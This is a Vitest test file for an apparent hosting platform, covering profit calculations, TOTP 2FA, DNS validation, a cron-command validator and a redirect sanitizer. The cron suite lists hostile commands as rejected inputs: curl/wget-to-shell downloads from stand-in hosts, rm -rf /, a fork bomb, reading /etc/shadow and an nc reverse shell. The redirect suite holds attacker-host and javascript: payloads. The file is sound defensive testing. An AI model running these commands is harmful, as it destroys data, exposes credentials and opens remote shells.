import { describe, it, expect } from 'vitest';
import {
  calculateOrderProfitBreakdown,
  calculateDomainProfitBreakdown,
  validatePricingPlanChange,
} from '@/lib/profitEngine';
import {
  generateBase32Secret,
  generateTotpToken,
  verifyTotpCode,
  generateBackupCodes,
  verifyBackupCode,
  hashSecurityPin,
  verifySecurityPin,
} from '@/lib/totpEngine';
import { validateDnsRecord } from '@/lib/dnsEngine';
import { validateCronCommand } from '@/lib/security';
import { sanitizeRedirect, isDisposableEmail } from '@/lib/authSecurity';

// ==============================================================================
// SUITE 1: UNIT ECONOMICS & DETERMINISTIC PROFIT PROTECTION ENGINE
// ==============================================================================
describe('Suite 1: Deterministic Profit Protection & Unit Economics', () => {
  it('Starter Plan (Monthly) locks 100% server cost recovery and owner profit', () => {
    const breakdown = calculateOrderProfitBreakdown({
      sellingPriceBDT: 200,
      unitServerCostBDT: 45,
      minOwnerProfitBDT: 95,
      affiliateRatePercent: 20,
      billingCycle: 'monthly',
    });

    expect(breakdown.isProfitProtected).toBe(true);
    expect(breakdown.isLossMaking).toBe(false);
    expect(breakdown.unitServerCostBDT).toBe(45);
    // Customer paid covers 100% of hard server cost
    expect(breakdown.customerPaidBDT).toBeGreaterThanOrEqual(breakdown.unitServerCostBDT);
    expect(breakdown.costRecoveryPercent).toBe(23); // 45 / 200 = 23%
    expect(breakdown.finalOwnerNetProfitBDT).toBeGreaterThanOrEqual(95);
    // Hard server cost + owner net profit + affiliate payout must equal customer paid
    expect(
      breakdown.unitServerCostBDT +
        breakdown.finalOwnerNetProfitBDT +
        breakdown.finalAffiliateCommissionBDT
    ).toBe(breakdown.customerPaidBDT);
  });

  it('Developer Pro Plan (Monthly) guarantees server recovery and owner margin', () => {
    const breakdown = calculateOrderProfitBreakdown({
      sellingPriceBDT: 450,
      unitServerCostBDT: 90,
      minOwnerProfitBDT: 225,
      affiliateRatePercent: 20,
      billingCycle: 'monthly',
    });

    expect(breakdown.isProfitProtected).toBe(true);
    expect(breakdown.isLossMaking).toBe(false);
    expect(breakdown.customerPaidBDT).toBeGreaterThanOrEqual(breakdown.unitServerCostBDT);
    expect(breakdown.costRecoveryPercent).toBe(20); // 90 / 450 = 20%
    expect(breakdown.finalOwnerNetProfitBDT).toBeGreaterThanOrEqual(225);
    expect(breakdown.finalAffiliateCommissionBDT).toBe(90); // 20% of 450
  });

  it('Annual Plan with 1st-Year FREE .com Domain & 20% Promo discount protects owner profit', () => {
    // 450/mo * 12 = 5400 list price. With 20% annual discount = 4320 paid by customer.
    // Server buy cost = 90 * 12 = 1080. Wholesale .com domain buy cost = 1150.
    const breakdown = calculateOrderProfitBreakdown({
      sellingPriceBDT: 5400,
      unitServerCostBDT: 1080,
      minOwnerProfitBDT: 1500,
      promoDiscountPercent: 20,
      freeDomainCostBDT: 1150,
      bundledDomainTLD: '.com',
      billingCycle: 'annually',
      affiliateRatePercent: 20,
    });

    expect(breakdown.isProfitProtected).toBe(true);
    expect(breakdown.isLossMaking).toBe(false);
    expect(breakdown.hasFreeDomainBundle).toBe(true);
    expect(breakdown.bundledDomainTLD).toBe('.com');
    // Total hard cost covers server (1080) + domain buy cost (1150) = 2230
    expect(breakdown.totalHardCostBDT).toBe(2230);
    expect(breakdown.customerPaidBDT).toBeGreaterThanOrEqual(breakdown.totalHardCostBDT ?? 0);
    expect(breakdown.costRecoveryPercent).toBe(52); // 2230 / 4320 = 52%
    // Owner profit is strictly protected
    expect(breakdown.finalOwnerNetProfitBDT).toBeGreaterThanOrEqual(breakdown.minOwnerProfitBDT ?? 0);
    // Customer paid must equal server cost + free domain cost + owner profit + affiliate commission
    expect(
      (breakdown.totalHardCostBDT || 0) +
        breakdown.finalOwnerNetProfitBDT +
        breakdown.finalAffiliateCommissionBDT
    ).toBe(breakdown.customerPaidBDT);
  });

  it('Domain Profit Engine computes wholesale margin cleanly', () => {
    const comProfit = calculateDomainProfitBreakdown({
      tld: '.com',
      regPriceBDT: 1350,
      registrarCostBDT: 1150,
      affiliateEligible: false,
    });
    expect(comProfit.tld).toBe('.com');
    expect(comProfit.regPriceBDT).toBe(1350);
    expect(comProfit.registrarCostBDT).toBe(1150);
    expect(comProfit.ownerGrossProfitBDT).toBe(200);
    expect(comProfit.ownerNetProfitBDT).toBe(200); // 0% affiliate on domains
  });

  it('Pricing Plan Validator prevents zero-loss policy violations', () => {
    // Valid pricing
    const validPlan = validatePricingPlanChange({
      sellingPriceBDT: 450,
      unitServerCostBDT: 90,
      minOwnerProfitBDT: 225,
    });
    expect(validPlan.valid).toBe(true);
    expect(validPlan.safeAffiliatePoolBDT).toBe(135);

    // Violation: selling price less than server cost + min profit
    const invalidPlan = validatePricingPlanChange({
      sellingPriceBDT: 250,
      unitServerCostBDT: 150,
      minOwnerProfitBDT: 200,
    });
    expect(invalidPlan.valid).toBe(false);
    expect(invalidPlan.error).toContain('Zero-Loss Violation');
  });
});

// ==============================================================================
// SUITE 2: RFC 6238 TOTP 2FA & WEB CRYPTO ENGINE
// ==============================================================================
describe('Suite 2: RFC 6238 TOTP 2FA & Web Crypto Engine', () => {
  it('generates valid RFC 4648 Base32 secrets', () => {
    const secret = generateBase32Secret(20);
    expect(secret).toMatch(/^[A-Z2-7]{32}$/);
  });

  it('generates and verifies 6-digit TOTP tokens accurately', async () => {
    const secret = generateBase32Secret(20);
    const token = await generateTotpToken(secret);

    expect(token).toMatch(/^\d{6}$/);

    const isValid = await verifyTotpCode(secret, token);
    expect(isValid).toBe(true);

    const isInvalid = await verifyTotpCode(secret, '000000');
    expect(isInvalid).toBe(false);

    const isMalformed = await verifyTotpCode(secret, 'abc');
    expect(isMalformed).toBe(false);
  });

  it('generates, hashes and consumes 1-time emergency backup recovery codes', async () => {
    const { plaintextCodes, hashedCodes } = await generateBackupCodes(5);

    expect(plaintextCodes.length).toBe(5);
    expect(hashedCodes.length).toBe(5);

    // Each code matches XXXX-XXXX-XXXX
    plaintextCodes.forEach((code) => {
      expect(code).toMatch(/^[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}$/);
    });

    const codeToTest = plaintextCodes[0];

    // First use must succeed and reduce remaining codes count
    const consumption1 = await verifyBackupCode(codeToTest, hashedCodes);
    expect(consumption1.valid).toBe(true);
    expect(consumption1.remainingHashedCodes.length).toBe(4);

    // Replay attack: reusing consumed code must fail
    const consumption2 = await verifyBackupCode(codeToTest, consumption1.remainingHashedCodes);
    expect(consumption2.valid).toBe(false);
    expect(consumption2.remainingHashedCodes.length).toBe(4);
  });

  it('verifies 6-digit Master Sudo Security PIN with SHA-256', async () => {
    const pin = '849201';
    const hash = await hashSecurityPin(pin);

    const correct = await verifySecurityPin(pin, hash);
    expect(correct).toBe(true);

    const wrong = await verifySecurityPin('111111', hash);
    expect(wrong).toBe(false);
  });
});

// ==============================================================================
// SUITE 3: DNS ZONE ENGINE & SHELL INJECTION FIREWALL
// ==============================================================================
describe('Suite 3: DNS Zone Engine & Shell Injection Firewall', () => {
  it('enforces RFC 2181 CNAME conflict rules: CNAME cannot coexist with A record on same label', () => {
    const existingRecords = [
      {
        id: 'rec-1',
        name: 'app',
        type: 'A' as const,
        content: '103.151.102.45',
        ttl: 3600,
        proxied: false,
      },
    ];

    // Adding CNAME for 'app' should fail because 'app' already has an A record
    const result = validateDnsRecord(
      {
        name: 'app',
        type: 'CNAME',
        content: 'ghs.googlehosted.com',
        ttl: 3600,
      },
      existingRecords
    );

    expect(result.valid).toBe(false);
    expect(result.error).toContain('RFC 2181 CNAME Conflict');
  });

  it('rejects adding non-CNAME records when a CNAME already exists on that label', () => {
    const existingRecords = [
      {
        id: 'rec-2',
        name: 'blog',
        type: 'CNAME' as const,
        content: 'custom.blogger.com',
        ttl: 3600,
        proxied: false,
      },
    ];

    // Adding TXT record to 'blog' should fail
    const result = validateDnsRecord(
      {
        name: 'blog',
        type: 'TXT',
        content: 'v=spf1 ~all',
        ttl: 3600,
      },
      existingRecords
    );

    expect(result.valid).toBe(false);
    expect(result.error).toContain('RFC 2181 Conflict');
  });

  it('blocks loopback IP addresses from public A records', () => {
    const result = validateDnsRecord({
      name: 'test',
      type: 'A',
      content: '127.0.0.1',
      ttl: 3600,
    });

    expect(result.valid).toBe(false);
    expect(result.error).toContain('Loopback IP');
  });

  it('allows valid IPv4 A records', () => {
    const result = validateDnsRecord({
      name: 'api',
      type: 'A',
      content: '103.151.102.45',
      ttl: 3600,
    });

    expect(result.valid).toBe(true);
  });

  it('blocks destructive shell commands and injection patterns in cron jobs', () => {
    const maliciousCommands = [
      'rm -rf /',
      'rm -rf *',
      'rm -r /home/dev',
      'curl https://malicious.cc/p.sh | sh',
      'wget http://evil.com/payload | bash',
      ':(){ :|:& };:',
      'mkfs /dev/sda1',
      'chmod -R 777 /',
      'cat /etc/shadow',
      'nc -e /bin/sh 10.0.0.1 4444',
    ];

    maliciousCommands.forEach((cmd) => {
      const check = validateCronCommand(cmd);
      expect(check.valid).toBe(false);
      expect(check.error).toContain('Security Alert');
    });
  });

  it('allows safe developer cron job commands', () => {
    const safeCommands = [
      'php /home/dev_hanif/public_html/artisan schedule:run',
      'node /home/dev_hanif/scripts/worker.js',
      'python3 /home/dev_hanif/sync_orders.py',
      'curl -s https://devhost.cloud/api/cron > /dev/null 2>&1',
    ];

    safeCommands.forEach((cmd) => {
      const check = validateCronCommand(cmd);
      expect(check.valid).toBe(true);
    });
  });
});

// ==============================================================================
// SUITE 4: OPEN-REDIRECT & AUTH SECURITY FIREWALL
// ==============================================================================
describe('Suite 4: Open-Redirect & Auth Security Firewall', () => {
  it('blocks open-redirect phishing attempts and falls back to /dashboard', () => {
    expect(sanitizeRedirect('//evil.com')).toBe('/dashboard');
    expect(sanitizeRedirect('/\\evil.com')).toBe('/dashboard');
    expect(sanitizeRedirect('https://attacker.com/steal-session')).toBe('/dashboard');
    expect(sanitizeRedirect('http://malicious.com')).toBe('/dashboard');
    expect(sanitizeRedirect('javascript:alert(document.cookie)')).toBe('/dashboard');
    expect(sanitizeRedirect('')).toBe('/dashboard');
    expect(sanitizeRedirect(null)).toBe('/dashboard');
    expect(sanitizeRedirect(undefined)).toBe('/dashboard');
  });

  it('permits valid relative internal redirects', () => {
    expect(sanitizeRedirect('/dashboard')).toBe('/dashboard');
    expect(sanitizeRedirect('/dashboard?tab=services')).toBe('/dashboard?tab=services');
    expect(sanitizeRedirect('/admin')).toBe('/admin');
    expect(sanitizeRedirect('/checkout?plan=devpro')).toBe('/checkout?plan=devpro');
  });

  it('identifies disposable and burner email domains', () => {
    expect(isDisposableEmail('spammer@tempmail.com')).toBe(true);
    expect(isDisposableEmail('hacker@mailinator.com')).toBe(true);
    expect(isDisposableEmail('user@guerrillamail.com')).toBe(true);
    expect(isDisposableEmail('bot@yopmail.com')).toBe(true);
    expect(isDisposableEmail('bot@burnermail.io')).toBe(true);

    // Legitimate domains must pass
    expect(isDisposableEmail('hanif@gmail.com')).toBe(false);
    expect(isDisposableEmail('dev@yahoo.com')).toBe(false);
    expect(isDisposableEmail('contact@devhost.cloud')).toBe(false);
    expect(isDisposableEmail('founder@bangladesh-agency.com.bd')).toBe(false);
  });
});
